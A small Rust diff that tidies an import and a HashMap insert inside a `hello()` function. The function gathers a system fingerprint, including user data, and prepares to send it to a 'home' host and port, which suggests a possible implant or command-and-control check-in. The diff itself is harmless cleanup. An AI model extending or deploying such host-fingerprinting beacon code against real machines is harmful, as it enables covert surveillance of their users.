@@ -6,7 +6,7 @@ use std::collections::HashMap;
 use collector::SystemFingerprint;
 use comms::Communicator;
 use comms::client::Request;
-use windows::core::{Error, Result};
+use windows::core::Result;
 
 pub fn hello() -> Result<()> {
     let fingerprint = SystemFingerprint::collect()?;
@@ -21,9 +21,7 @@ pub fn hello() -> Result<()> {
     let port: u16 = home[1].parse().unwrap();
 
     let mut headers: HashMap<String, String> = HashMap::new();
-    headers
-        .insert("Content-Type".to_string(), "text/plain".to_string())
-        .unwrap();
+    headers.insert("Content-Type".to_string(), "text/plain".to_string());
 
     let body = fingerprint
         .user
